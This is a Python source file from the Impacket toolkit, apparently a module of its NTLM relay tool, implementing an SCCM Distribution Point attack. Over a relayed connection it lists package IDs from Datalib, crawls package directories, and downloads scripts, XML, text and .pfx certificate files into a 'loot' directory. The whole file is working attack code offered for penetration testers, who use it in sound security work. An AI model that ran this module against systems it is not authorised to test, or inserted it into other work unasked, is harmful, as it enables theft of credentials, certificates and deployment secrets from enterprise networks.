# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM relay attack to dump files from Distribution Points
# 
# Authors:
#    Quentin Roland(@croco_byte - Synacktiv)
#    Based on SCCMSecrets.py (https://github.com/synacktiv/SCCMSecrets/)
#    Inspired by the initial pull request of Alberto Rodriguez (@__ar0d__)
#    Credits to @badsectorlabs for the datalib file indexing method

import os
import json
import urllib

from html.parser                                        import HTMLParser
from datetime                                           import datetime
from impacket                                           import LOG


def print_tree(d, out, prefix=""):
    keys = list(d.keys())
    for i, key in enumerate(keys):
        is_last = (i == len(keys) - 1)
        if isinstance(d[key], dict):
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}/\n")
            new_prefix = f"{prefix}{'    ' if is_last else '│   '}"
            print_tree(d[key], out, new_prefix)
        else:
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}\n")

class PackageIDsRetriever(HTMLParser):
    def __init__(self):
        super().__init__()
        self.package_ids = set()

    def handle_starttag(self, tag, attrs):
        if tag == 'a':
            for attr in attrs:
                if attr[0] == 'href':
                    href = attr[1]
                    parts = href.split('/')
                    last_part = parts[-1].strip()
                    if not last_part.endswith('.INI'):
                        self.package_ids.add(last_part)

class FilesAndDirsRetriever(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
        self.previous_data = ""

    def handle_starttag(self, tag, attrs):
        self.current_tag = tag
        if tag == 'a':
            href = dict(attrs).get('href')
            if href:
                self.links.append((href, self.previous_data))

    def handle_data(self, data):
        self.previous_data = data.strip()



class SCCMDPAttack:
    max_recursion_depth = 7
    DP_DOWNLOAD_HEADERS = {
            "User-Agent": "SMS CCM 5.0 TS"
    }

    def _run(self):
        LOG.info("Starting SCCM DP attack")

        self.distribution_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"
        self.loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}_sccm_dp_loot"
        if self.config.SCCMDPExtensions == None:
            self.config.SCCMDPExtensions = [".ps1", ".bat", ".xml", ".txt", ".pfx"]
        elif not self.config.SCCMDPExtensions.strip():
            self.config.SCCMDPExtensions = []
        else:
            self.config.SCCMDPExtensions = [x.strip() for x in self.config.SCCMDPExtensions.split(',')]

        try:
            os.makedirs(self.loot_dir, exist_ok=True)
            LOG.info(f"Loot directory is: {self.loot_dir}")
        except Exception as err:
            LOG.error(f"Error creating base output directory: {err}")
            return


        # If a set of URLs was provided, do not reindex
        if self.config.SCCMDPFiles is None:
            try:
                LOG.debug("Retrieving package IDs from Datalib")
                self.package_ids = set()
                self.fetch_package_ids_from_datalib()
            except Exception as e:
                LOG.error(f"Encountered an error while indexing files from Distribution Point: {e}")
                return

        try:
            LOG.debug("Performing file download")
            self.download_target_files()
            LOG.info("File download performed")
        except Exception as e:
            LOG.error(f"Encountered an error while downloading target files: {e}")
            return
        
        LOG.info(f"DONE - attack finished. Check loot directory {self.loot_dir}")




    def recursive_file_extract(self, data):
        to_download = []
        if isinstance(data, dict):
            for key, value in data.items():
                if value is None and key.endswith(tuple(self.config.SCCMDPExtensions)):
                    to_download.append(key)
                else:
                    to_download.extend(self.recursive_file_extract(data[key]))
        return to_download
    

    def download_files(self, files):
        for file in files:
            try:
                parsed_url = urllib.parse.urlparse(file)
                filename = '__'.join(parsed_url.path.split('/')[3:])
                package = parsed_url.path.split('/')[2]
                self.client.request("GET", file, headers=self.DP_DOWNLOAD_HEADERS)
                r = self.client.getresponse().read()
                output_file = f"{self.loot_dir}/packages/{package}/{filename}"
                with open(output_file, 'wb') as f:
                    f.write(r)
                LOG.info(f"Package {package} - downloaded file {filename}")
            except Exception as e:
                LOG.error(f"[!] Error when downloading the following file: {file}")
                LOG.error(f"{e}")


    def download_target_files(self):
        if self.config.SCCMDPFiles is not None:
            with open(self.config.SCCMDPFiles, 'r') as f:
                contents = f.read().splitlines()
            package_ids = set()
            to_download = []
            for file in contents:
                try:
                    package_ids.add(urllib.parse.urlparse(file).path.split('/')[2])
                    if file.strip() is not None: to_download.append(file) 
                except:
                    LOG.error(f"(Skipping) URL has wrong format: {file}")
                    continue
            for package_id in package_ids:
                os.makedirs(f'{self.loot_dir}/packages/{package_id}', exist_ok=True)
            self.download_files(to_download)
        else:
            self.handle_packages()


    def handle_packages(self):
        with open(f"{self.loot_dir}/index.txt", "a") as f:
            for i, package_id in enumerate(self.package_ids):
                package_index = {package_id: {}}
                self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/sms_dp_smspkg$/{package_id}", 0)
                print_tree(package_index, f)
                to_download = self.recursive_file_extract(package_index[package_id])
                if len(to_download) == 0:
                    LOG.debug(f"Handled package {package_id} ({i+1}/{len(self.package_ids)})")
                    continue
                os.makedirs(f'{self.loot_dir}/packages/{package_id}', exist_ok=True)
                self.download_files(to_download)
                LOG.debug(f"Handled package {package_id} ({i+1}/{len(self.package_ids)})")
        LOG.info("[+] Package handling complete")


    def recursive_package_directory_fetch(self, object, directory, depth):
        depth += 1

        self.client.request("GET", directory, headers=self.DP_DOWNLOAD_HEADERS)
        r = self.client.getresponse().read()

        parser = FilesAndDirsRetriever()
        parser.feed(r.decode())
        
        files = []
        for href in parser.links:
            if '<dir>' in href[1]:
                if depth <= self.max_recursion_depth:
                    object[href[0]] = {}
                    self.recursive_package_directory_fetch(object[href[0]], href[0], depth)
                else:
                    object[href[0]] = "Maximum recursion depth reached"
            else:
                files.append(href[0])
        for file in files:
            object[file] = None


    def fetch_package_ids_from_datalib(self):
        self.client.request("GET", f"{self.distribution_point}/sms_dp_smspkg$/Datalib", headers=self.DP_DOWNLOAD_HEADERS)
        r = self.client.getresponse().read()
        packageIDs_parser = PackageIDsRetriever()
        packageIDs_parser.feed(r.decode())
        self.package_ids = packageIDs_parser.package_ids
            
        LOG.info(f"Found {len(self.package_ids)} packages")
        LOG.debug(self.package_ids)